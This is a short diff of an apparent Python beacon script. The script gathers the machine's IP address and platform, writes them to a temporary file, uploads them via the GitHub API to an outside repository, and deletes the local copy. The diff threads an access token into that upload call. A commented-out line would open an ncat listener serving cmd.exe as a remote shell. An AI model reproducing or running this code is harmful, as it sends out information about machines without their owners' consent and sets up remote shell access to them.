@@ -15,7 +15,7 @@ def delete_file(file_path):
 
 
 
-def update_file_on_github(file_path):
+def update_file_on_github(file_path,token):
     url = f"https://api.github.com/repos/kaki714/Not/contents/data/info.txt"
     headers = {
         'Accept': 'application/vnd.github.v3+json',
@@ -83,7 +83,7 @@ def run(token):
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
         create_file("data.txt",stmnt)
         #subir_archivo('data.txt', stmnt )
-        update_file_on_github("data.txt")
+        update_file_on_github("data.txt",token)
         delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
